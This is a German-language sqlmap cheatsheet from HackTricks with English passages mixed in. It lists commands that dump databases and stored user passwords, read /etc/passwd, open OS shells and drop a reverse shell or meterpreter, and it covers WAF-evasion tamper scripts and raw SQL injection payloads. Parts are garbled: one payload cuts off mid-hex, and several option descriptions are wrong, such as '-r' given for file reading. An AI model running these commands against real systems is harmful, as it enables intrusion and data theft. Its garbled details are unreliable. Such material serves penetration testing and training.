# SQLMap - Cheatsheet

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Sofort verf√ºgbare Einrichtung f√ºr Schwachstellenbewertung und Penetrationstests**. F√ºhren Sie einen vollst√§ndigen Pentest von √ºberall aus mit 20+ Tools und Funktionen durch, die von der Aufkl√§rung bis zum Bericht reichen. Wir ersetzen keine Pentester - wir entwickeln benutzerdefinierte Tools, Erkennungs- und Exploit-Module, um ihnen etwas Zeit zu geben, um tiefer zu graben, Shells zu √∂ffnen und Spa√ü zu haben.

{% embed url="https://pentest-tools.com/" %}

## Grundlegende Argumente f√ºr SQLmap

### Generisch
```bash
-u "<URL>"
-p "<PARAM TO TEST>"
--user-agent=SQLMAP
--random-agent
--threads=10
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>"
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=http://127.0.0.1:8080
--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
```
#### Intern

##### Retrieve Information

Um Informationen abzurufen, k√∂nnen Sie die folgenden Befehle verwenden:

- **Datenbanken abrufen**: `--dbs` oder `-D`
- **Tabellen abrufen**: `--tables` oder `-T` -D <Datenbankname>
- **Spalten abrufen**: `--columns` oder `-C` -D <Datenbankname> -T <Tabellenname>
- **Daten abrufen**: `--dump` oder `-d` -D <Datenbankname> -T <Tabellenname> -C <Spaltenname>

##### Beispiel:

```bash
sqlmap -u "http://example.com/page.php?id=1" --dbs
sqlmap -u "http://example.com/page.php?id=1" -D dbname --tables
sqlmap -u "http://example.com/page.php?id=1" -D dbname -T tablename --columns
sqlmap -u "http://example.com/page.php?id=1" -D dbname -T tablename -C columnname --dump
```

##### Exfiltration von Daten

Um Daten aus der Datenbank zu exfiltrieren, k√∂nnen Sie die Option `--file-read` oder `-r` verwenden. Sie m√ºssen den Pfad zur Datei angeben, die Sie lesen m√∂chten.

##### Beispiel:

```bash
sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"
```

##### SQL-Shell

Sie k√∂nnen auch eine SQL-Shell √∂ffnen, um direkt mit der Datenbank zu interagieren. Verwenden Sie dazu die Option `--sql-shell`.

##### Beispiel:

```bash
sqlmap -u "http://example.com/page.php?id=1" --sql-shell
```

##### Weitere Informationen

F√ºr weitere Informationen zu den verf√ºgbaren Befehlen und Optionen k√∂nnen Sie die offizielle [sqlmap-Dokumentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage) konsultieren.
```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
--privileges #Get privileges
```
#### DB-Daten

```plaintext
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8316=8316

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 8316 FROM(SELECT COUNT(*),CONCAT(0x717a6a7071,(SELECT (ELT(8316=8316,1))),0x717a627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 8316 FROM (SELECT(SLEEP(5)))a)

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: id=-9999 UNION ALL SELECT CONCAT(0x717a6a7071,0x4e4e4e4e4e546d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4e6d4e4e4e4e4
```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```
## Injektionsstelle

### Von Burp/ZAP erfassen

Erfassen Sie die Anfrage und erstellen Sie eine req.txt Datei
```bash
sqlmap -r req.txt --current-user
```
### GET-Anfrage-Injektion

GET-Anfrage-Injektion ist eine Technik, bei der ein Angreifer sch√§dlichen Code in die Parameter einer GET-Anfrage einschleust, um eine SQL-Injektion durchzuf√ºhren. Diese Technik wird h√§ufig verwendet, um auf Datenbanken zuzugreifen und vertrauliche Informationen zu extrahieren.

#### Funktionsweise

Bei einer GET-Anfrage werden die Parameter in der URL angegeben. Ein Angreifer kann den Wert eines Parameters so manipulieren, dass er SQL-Code enth√§lt. Wenn die Anwendung unsicher ist und die Eingabe nicht ordnungsgem√§√ü validiert oder bereinigt wird, kann der sch√§dliche Code in die Datenbankabfrage eingef√ºgt werden.

#### Beispiel

Angenommen, eine Anwendung verwendet eine GET-Anfrage, um Benutzerinformationen abzurufen:

```
https://example.com/user?username=admin&password=pass123
```

Ein Angreifer k√∂nnte versuchen, eine SQL-Injektion durchzuf√ºhren, indem er den `username`-Parameter manipuliert:

```
https://example.com/user?username=admin' OR '1'='1'--&password=pass123
```

In diesem Beispiel wird der sch√§dliche Code `' OR '1'='1'--` in den `username`-Parameter eingef√ºgt. Wenn die Anwendung anf√§llig ist, wird die Datenbankabfrage so interpretiert, dass sie alle Benutzer zur√ºckgibt, da `'1'='1'` immer wahr ist.

#### Auswirkungen

Eine erfolgreiche GET-Anfrage-Injektion kann einem Angreifer den Zugriff auf vertrauliche Informationen erm√∂glichen, wie z.B. Benutzernamen, Passw√∂rter oder andere sensible Daten. Dar√ºber hinaus kann ein Angreifer die Datenbank manipulieren, Daten l√∂schen oder √Ñnderungen vornehmen.

#### Schutzma√ünahmen

Um sich vor GET-Anfrage-Injektionen zu sch√ºtzen, sollten Entwickler sicherstellen, dass alle Eingaben ordnungsgem√§√ü validiert und bereinigt werden, bevor sie in Datenbankabfragen verwendet werden. Parameterisierte Abfragen sollten verwendet werden, um SQL-Injektionen zu verhindern. Dar√ºber hinaus sollten Sicherheitspatches und Updates regelm√§√üig angewendet werden, um bekannte Sicherheitsl√ºcken zu schlie√üen.
```bash
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
### POST Request Injection

#### Introduction

POST request injection is a technique used to exploit vulnerabilities in web applications that accept user input through POST requests. By injecting malicious code into the POST parameters, an attacker can manipulate the application's behavior and potentially gain unauthorized access to sensitive information or perform unauthorized actions.

#### SQL Injection

One common type of POST request injection is SQL injection. In this attack, the attacker injects SQL code into the POST parameters to manipulate the application's database queries. This can allow the attacker to retrieve, modify, or delete data from the database.

#### Exploiting POST Request Injection with SQLMap

SQLMap is a powerful tool that automates the process of detecting and exploiting SQL injection vulnerabilities. It can be used to test web applications for POST request injection vulnerabilities and automatically exploit them.

To use SQLMap for POST request injection, you need to provide it with the necessary information, such as the target URL, the POST parameters, and the payload to inject. SQLMap will then analyze the application's response and attempt to exploit the SQL injection vulnerability.

#### Usage

To use SQLMap for POST request injection, follow these steps:

1. Identify the target web application and the specific POST request that accepts user input.
2. Use a proxy tool, such as Burp Suite, to intercept and modify the POST request.
3. Modify the POST parameters to include the payload for the SQL injection attack.
4. Forward the modified request to the server and observe the response.
5. If the response indicates a successful SQL injection, use SQLMap to automate the exploitation process.

#### Conclusion

POST request injection, particularly SQL injection, is a serious vulnerability that can lead to unauthorized access and data leakage. It is important for web developers and security professionals to understand and mitigate these vulnerabilities to protect sensitive information. By using tools like SQLMap, the process of detecting and exploiting POST request injection vulnerabilities can be automated, making it easier to identify and fix these issues.
```bash
sqlmap -u "http://example.com" --data "username=*&password=*"
```
### Injektionen in Headern und anderen HTTP-Methoden

SQLMap supports injection testing not only in the request parameters, but also in the headers and other HTTP methods. This allows you to test for SQL injection vulnerabilities in different parts of the HTTP request.

To perform injection testing in headers, you can use the `--headers` option followed by the headers you want to test. For example:

```
sqlmap -u http://example.com/ --headers="User-Agent: sqlmap"
```

This command will send a request to `http://example.com/` with the specified `User-Agent` header set to `sqlmap`. SQLMap will then analyze the response to check for any SQL injection vulnerabilities.

Similarly, you can perform injection testing in other HTTP methods such as `POST`, `PUT`, `DELETE`, etc. To do this, you need to use the `--method` option followed by the desired HTTP method. For example:

```
sqlmap -u http://example.com/ --method=POST --data="param1=value1&param2=value2"
```

In this command, SQLMap will send a `POST` request to `http://example.com/` with the specified data parameters. It will then analyze the response to detect any SQL injection vulnerabilities.

By testing injections in headers and other HTTP methods, you can expand your scope of vulnerability testing and increase the chances of finding SQL injection vulnerabilities in different parts of the application.
```bash
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```
### Anzeigen einer Zeichenkette, wenn die Injection erfolgreich ist

Wenn Sie SQL-Injection-Tests mit SQLMap durchf√ºhren, k√∂nnen Sie eine Zeichenkette angeben, die angezeigt wird, wenn die Injection erfolgreich ist. Dies kann hilfreich sein, um zu √ºberpr√ºfen, ob die Injection korrekt funktioniert und ob die Anwendung anf√§llig f√ºr SQL-Injection ist.

Um eine Erfolgsmeldung anzuzeigen, verwenden Sie den Parameter `--string`. Geben Sie die Zeichenkette an, die angezeigt werden soll, wenn die Injection erfolgreich ist. Zum Beispiel:

```
sqlmap -u "http://example.com/vulnerable.php?id=1" --string "Injection erfolgreich"
```

Wenn die Injection erfolgreich ist, gibt SQLMap die angegebene Zeichenkette aus. Andernfalls wird keine Meldung angezeigt.

Stellen Sie sicher, dass die angegebene Zeichenkette eindeutig ist und in der Anwendung nicht vorkommt, um falsche positive Ergebnisse zu vermeiden.
```bash
--string="string_showed_when_TRUE"
```
### Eval

**Sqlmap** erm√∂glicht die Verwendung von `-e` oder `--eval`, um jeden Payload vor dem Senden mit einem Python-Oneliner zu verarbeiten. Dadurch wird es sehr einfach und schnell, den Payload vor dem Senden auf benutzerdefinierte Weise zu verarbeiten. Im folgenden Beispiel wird die **Flask-Cookie-Sitzung** **von Flask mit dem bekannten Geheimnis signiert, bevor sie gesendet wird**:
```bash
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
```
### Shell

Die Shell ist eine Schnittstelle, die es dem Benutzer erm√∂glicht, mit dem Betriebssystem zu interagieren. Sie erm√∂glicht die Ausf√ºhrung von Befehlen und die Verwaltung von Dateien und Verzeichnissen. In der Shell k√∂nnen Sie Befehle eingeben, um verschiedene Aktionen auszuf√ºhren, wie z.B. das Starten von Programmen, das Navigieren durch das Dateisystem und das Verwalten von Prozessen. Es gibt verschiedene Arten von Shells, darunter die Bourne-Shell (sh), die Bash-Shell (bash) und die Z-Shell (zsh). Die Shell ist ein leistungsstolles Werkzeug f√ºr Hacker, da sie es ihnen erm√∂glicht, Befehle auszuf√ºhren und auf Systemebene zu interagieren.
```bash
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```
### Datei lesen

Um eine Datei mit SQL-Injection zu lesen, k√∂nnen Sie die Option `--file-read` verwenden. Diese Option erm√∂glicht es Ihnen, den Inhalt einer Datei auf dem Zielsystem anzuzeigen.

Syntax:

```plaintext
--file-read=<Dateipfad>
```

Beispiel:

```plaintext
sqlmap -u "http://example.com/page.php?id=1" --file-read=/etc/passwd
```

Dieses Beispiel liest den Inhalt der Datei `/etc/passwd` auf dem Zielsystem. Sie k√∂nnen den Dateipfad entsprechend anpassen, um andere Dateien zu lesen.

Bitte beachten Sie, dass das Lesen von Dateien auf einem fremden System illegal sein kann, es sei denn, Sie haben die ausdr√ºckliche Erlaubnis des Eigent√ºmers.
```bash
--file-read=/etc/passwd
```
### Eine Website mit SQLmap durchsuchen und automatisch ausnutzen

SQLmap ist ein leistungsstolles Tool, mit dem Sie Websites auf SQL-Injektionsl√ºcken √ºberpr√ºfen k√∂nnen. Es bietet auch die M√∂glichkeit, automatisch Exploits f√ºr diese L√ºcken zu generieren. In diesem Abschnitt erfahren Sie, wie Sie SQLmap verwenden, um eine Website zu durchsuchen und automatisch Exploits auszuf√ºhren.

#### Schritt 1: Crawlen der Website

Bevor Sie SQLmap verwenden k√∂nnen, m√ºssen Sie die Website crawlen, um alle verf√ºgbaren Links und Parameter zu identifizieren. Verwenden Sie dazu den folgenden Befehl:

```
sqlmap -u <URL> --crawl=3
```

Ersetzen Sie `<URL>` durch die URL der zu √ºberpr√ºfenden Website. Der Parameter `--crawl=3` gibt an, dass SQLmap drei Ebenen tief in der Website crawlen soll, um alle verf√ºgbaren Links und Parameter zu finden.

#### Schritt 2: Identifizieren von anf√§lligen Parametern

Nachdem das Crawlen abgeschlossen ist, k√∂nnen Sie die gefundenen Links und Parameter anzeigen. Verwenden Sie dazu den Befehl:

```
sqlmap -u <URL> --crawl=3 --forms
```

Dieser Befehl zeigt Ihnen alle gefundenen Links und Parameter an, die f√ºr potenzielle SQL-Injektionsl√ºcken anf√§llig sein k√∂nnten.

#### Schritt 3: Ausnutzen der SQL-Injektionsl√ºcken

Sobald Sie anf√§llige Parameter identifiziert haben, k√∂nnen Sie SQLmap verwenden, um automatisch Exploits f√ºr diese L√ºcken zu generieren. Verwenden Sie dazu den folgenden Befehl:

```
sqlmap -u <URL> --crawl=3 --forms -p <Parameter>
```

Ersetzen Sie `<URL>` durch die URL der zu √ºberpr√ºfenden Website und `<Parameter>` durch den anf√§lligen Parameter, den Sie ausnutzen m√∂chten. SQLmap wird automatisch Exploits generieren und versuchen, die SQL-Injektionsl√ºcken auszunutzen.

#### Schritt 4: √úberpr√ºfen der Ergebnisse

Nachdem SQLmap die Exploits ausgef√ºhrt hat, k√∂nnen Sie die Ergebnisse √ºberpr√ºfen. SQLmap generiert einen detaillierten Bericht mit Informationen √ºber die gefundenen L√ºcken und die erfolgreichen Exploits.

Es ist wichtig zu beachten, dass das Ausnutzen von SQL-Injektionsl√ºcken auf Websites, f√ºr die Sie keine Berechtigung haben, illegal ist. Stellen Sie sicher, dass Sie die erforderlichen Genehmigungen haben, bevor Sie SQLmap verwenden, um eine Website zu durchsuchen und Exploits auszuf√ºhren.
```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```
### Zweite-Ordnung-Injektion

Second Order Injection ist eine fortgeschrittene Technik, bei der ein Angreifer eine Schwachstelle in einer Anwendung ausnutzt, um sch√§dlichen Code einzuf√ºgen, der jedoch nicht sofort ausgef√ºhrt wird. Stattdessen wird der Code in der Datenbank oder in einer anderen persistenten Speicherung gespeichert und zu einem sp√§teren Zeitpunkt ausgef√ºhrt.

Diese Art von Angriff ist besonders gef√§hrlich, da sie oft schwer zu erkennen ist und es dem Angreifer erm√∂glicht, √ºber einen l√§ngeren Zeitraum hinweg unbemerkt zu bleiben. Der Angreifer kann den gespeicherten Code dann ausl√∂sen, indem er eine andere Aktion in der Anwendung ausf√ºhrt, wie z.B. das Abrufen einer bestimmten Seite oder das Ausl√∂sen eines bestimmten Ereignisses.

Um Second Order Injection zu erkennen und zu verhindern, ist es wichtig, sicherzustellen, dass alle Benutzereingaben ordnungsgem√§√ü validiert und bereinigt werden. Dar√ºber hinaus sollten Anwendungen regelm√§√üig auf Schwachstellen √ºberpr√ºft und gepatcht werden, um potenzielle Angriffspunkte zu minimieren.

SQLMap ist ein beliebtes Tool, das bei der Erkennung und Ausnutzung von SQL-Injektionen, einschlie√ülich Second Order Injection, hilfreich sein kann. Es automatisiert den Prozess der Identifizierung von Schwachstellen und erm√∂glicht es dem Benutzer, verschiedene Angriffstechniken auszuprobieren, um die Sicherheit einer Anwendung zu testen.
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```
[**Lesen Sie diesen Beitrag**](second-order-injection-sqlmap.md)**√ºber die Durchf√ºhrung einfacher und komplexer Second-Order-Injections mit sqlmap.**

## Anpassung der Injektion

### Setzen Sie ein Suffix
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```
### Pr√§fix

### Description
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
```
### Hilfe bei der Suche nach einer booleschen Injection

Boolean Injection ist eine Technik, bei der wir boolesche Ausdr√ºcke verwenden, um Informationen aus einer Datenbank abzurufen. Diese Methode kann verwendet werden, um Schwachstellen in einer Webanwendung zu identifizieren und m√∂glicherweise sensible Daten zu extrahieren.

Um eine boolesche Injection durchzuf√ºhren, k√∂nnen wir SQLMap verwenden, ein leistungsstarkes Tool, das speziell f√ºr die Durchf√ºhrung von SQL-Injection-Angriffen entwickelt wurde. SQLMap automatisiert den Prozess der Erkennung und Ausnutzung von SQL-Injection-Schwachstellen.

Um eine boolesche Injection mit SQLMap durchzuf√ºhren, m√ºssen wir den Befehl `sqlmap` mit den entsprechenden Parametern ausf√ºhren. Hier ist ein Beispielbefehl:

```bash
sqlmap -u "http://example.com/page.php?id=1" --technique B
```

In diesem Beispiel verwenden wir die Option `-u`, um die URL der verwundbaren Seite anzugeben, und die Option `--technique B`, um SQLMap anzuweisen, die boolesche Injection-Technik zu verwenden.

Sobald SQLMap gestartet ist, wird es automatisch nach Schwachstellen suchen und versuchen, die Datenbankinformationen zu extrahieren. Es wird verschiedene boolesche Ausdr√ºcke verwenden, um die Datenbankabfragen zu manipulieren und die gew√ºnschten Informationen zu erhalten.

Es ist wichtig zu beachten, dass das Durchf√ºhren einer booleschen Injection ohne die ausdr√ºckliche Zustimmung des Eigent√ºmers der Webanwendung illegal ist. Es ist immer ratsam, diese Techniken nur in einer kontrollierten Umgebung oder mit ausdr√ºcklicher Genehmigung des Eigent√ºmers anzuwenden.
```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
```
### Manipulation

Denken Sie daran, dass **Sie Ihren eigenen Manipulationscode in Python erstellen k√∂nnen** und es ist sehr einfach. Ein Beispiel f√ºr eine Manipulation finden Sie auf der [Seite zur Second-Order-Injektion hier](second-order-injection-sqlmap.md).
```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
```
| Tamper                       | Beschreibung                                                                                                                        |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| apostrophemask.py            | Ersetzt das Apostroph-Zeichen durch seinen UTF-8-Vollbreiten-Gegenpart                                                                |
| apostrophenullencode.py      | Ersetzt das Apostroph-Zeichen durch seinen illegalen doppelten Unicode-Gegenpart                                                    |
| appendnullbyte.py            | H√§ngt das codierte NULL-Byte-Zeichen am Ende des Payloads an                                                                         |
| base64encode.py              | Kodiert alle Zeichen in einem gegebenen Payload mit Base64                                                                           |
| between.py                   | Ersetzt den Gr√∂√üer-als-Operator ('>') durch 'NOT BETWEEN 0 AND #'                                                                    |
| bluecoat.py                  | Ersetzt das Leerzeichen nach der SQL-Anweisung durch ein g√ºltiges zuf√§lliges Leerzeichen. Ersetzt anschlie√üend das Zeichen '=' durch den LIKE-Operator |
| chardoubleencode.py          | Verdoppelt die URL-Codierung aller Zeichen in einem gegebenen Payload (bereits codierte Zeichen werden nicht verarbeitet)           |
| commalesslimit.py            | Ersetzt Vorkommnisse wie 'LIMIT M, N' durch 'LIMIT N OFFSET M'                                                                       |
| commalessmid.py              | Ersetzt Vorkommnisse wie 'MID(A, B, C)' durch 'MID(A FROM B FOR C)'                                                                  |
| concat2concatws.py           | Ersetzt Vorkommnisse wie 'CONCAT(A, B)' durch 'CONCAT\_WS(MID(CHAR(0), 0, 0), A, B)'                                                 |
| charencode.py                | URL-codiert alle Zeichen in einem gegebenen Payload (bereits codierte Zeichen werden nicht verarbeitet)                            |
| charunicodeencode.py         | URL-codiert nicht codierte Zeichen in einem gegebenen Payload (bereits codierte Zeichen werden nicht verarbeitet). "%u0022"           |
| charunicodeescape.py         | URL-codiert nicht codierte Zeichen in einem gegebenen Payload (bereits codierte Zeichen werden nicht verarbeitet). "\u0022"           |
| equaltolike.py               | Ersetzt alle Vorkommnisse des Operators Gleich ('=') durch den Operator LIKE                                                         |
| escapequotes.py              | Maskiert Anf√ºhrungszeichen (' und ")                                                                                                |
| greatest.py                  | Ersetzt den Gr√∂√üer-als-Operator ('>') durch den entsprechenden 'GREATEST'-Operator                                                   |
| halfversionedmorekeywords.py | F√ºgt jedem Schl√ºsselwort eine versionierte MySQL-Kommentarzeichenfolge hinzu                                                         |
| ifnull2ifisnull.py           | Ersetzt Vorkommnisse wie 'IFNULL(A, B)' durch 'IF(ISNULL(A), B, A)'                                                                  |
| modsecurityversioned.py      | Umh√ºllt die vollst√§ndige Abfrage mit einer versionierten Kommentarzeichenfolge                                                     |
| modsecurityzeroversioned.py  | Umh√ºllt die vollst√§ndige Abfrage mit einer null-versionierten Kommentarzeichenfolge                                                |
| multiplespaces.py            | F√ºgt mehrere Leerzeichen um SQL-Schl√ºsselw√∂rter hinzu                                                                                 |
| nonrecursivereplacement.py   | Ersetzt vordefinierte SQL-Schl√ºsselw√∂rter durch geeignete Ersatzdarstellungen (z.B. .replace("SELECT", "")) Filter                   |
| percentage.py                | F√ºgt jedem Zeichen ein Prozentzeichen ('%') voran                                                                                    |
| overlongutf8.py              | Konvertiert alle Zeichen in einem gegebenen Payload (bereits codierte Zeichen werden nicht verarbeitet)                            |
| randomcase.py                | Ersetzt jedes Schl√ºsselwort-Zeichen durch einen zuf√§lligen Gro√ü-/Kleinschreibungswert                                                |
| randomcomments.py            | F√ºgt zuf√§llige Kommentare zu SQL-Schl√ºsselw√∂rtern hinzu                                                                                |
| securesphere.py              | H√§ngt einen speziell erstellten String an                                                                                             |
| sp\_password.py              | H√§ngt 'sp\_password' an das Ende des Payloads an, um es automatisch vor DBMS-Logs zu verschleiern                                   |
| space2comment.py             | Ersetzt das Leerzeichen (' ') durch Kommentare                                                                                        |
| space2dash.py                | Ersetzt das Leerzeichen (' ') durch einen Bindestrich-Kommentar ('--') gefolgt von einer zuf√§lligen Zeichenkette und einem Zeilenumbruch ('\n')                        |
| space2hash.py                | Ersetzt das Leerzeichen (' ') durch ein Rautenzeichen ('#') gefolgt von einer zuf√§lligen Zeichenkette und einem Zeilenumbruch ('\n')                      |
| space2morehash.py            | Ersetzt das Leerzeichen (' ') durch ein Rautenzeichen ('#') gefolgt von einer zuf√§lligen Zeichenkette und einem Zeilenumbruch ('\n')                      |
| space2mssqlblank.py          | Ersetzt das Leerzeichen (' ') durch ein zuf√§lliges Leerzeichen aus einer g√ºltigen Menge alternativer Zeichen                          |
| space2mssqlhash.py           | Ersetzt das Leerzeichen (' ') durch ein Rautenzeichen ('#') gefolgt von einem Zeilenumbruch ('\n')                                          |
| space2mysqlblank.py          | Ersetzt das Leerzeichen (' ') durch ein zuf√§lliges Leerzeichen aus einer g√ºltigen Menge alternativer Zeichen                          |
| space2mysqldash.py           | Ersetzt das Leerzeichen (' ') durch einen Bindestrich-Kommentar ('--') gefolgt von einem Zeilenumbruch ('\n')                                            |
| space2plus.py                | Ersetzt das Leerzeichen (' ') durch ein Pluszeichen ('+')                                                                             |
| space2randomblank.py         | Ersetzt das Leerzeichen (' ') durch ein zuf√§lliges Leerzeichen aus einer g√ºltigen Menge alternativer Zeichen                          |
| symboliclogical.py           | Ersetzt die logischen Operatoren AND und OR durch ihre symbolischen Entsprechungen (&& und                                                 |
| unionalltounion.py           | Ersetzt UNION ALL SELECT durch UNION SELECT                                                                                        |
| unmagicquotes.py             | Ersetzt das Anf√ºhrungszeichen (') durch eine mehrbyte-Kombination %bf%27 zusammen mit einem generischen Kommentar am Ende (um es funktionieren zu lassen)             |
| uppercase.py                 | Ersetzt jedes Schl√ºsselwort-Zeichen durch den Gro√übuchstabenwert 'INSERT'                                                             |
| varnish.py                   | F√ºgt einen HTTP-Header 'X-originating-IP' hinzu                                                                                      |
| versionedkeywords.py         | Umh√ºllt jedes nicht-funktionale Schl√ºsselwort mit einem versionierten MySQL-Kommentar                                                |
| versionedmorekeywords.py     | Umh√ºllt jedes Schl√ºsselwort mit einem versionierten MySQL-Kommentar                                                                 |
| xforwardedfor.py             | F√ºgt einen gef√§lschten HTTP-Header 'X-Forwarded-For' hinzu                                                                           |

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Sofort einsatzbereite Einrichtung f√ºr Schwachstellenbewertung und Penetrationstests**. F√ºhren Sie einen vollst√§ndigen Penetrationstest von √ºberall aus mit √ºber 20 Tools und Funktionen durch, die von der Aufkl√§rung bis zum Bericht reichen. Wir ersetzen keine Penetrationstester - wir entwickeln benutzerdefinierte Tools, Erkennungs- und Exploit-Module, um ihnen etwas Zeit zu geben, tiefer zu graben, Shells zu √∂ffnen und Spa√ü zu haben.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>
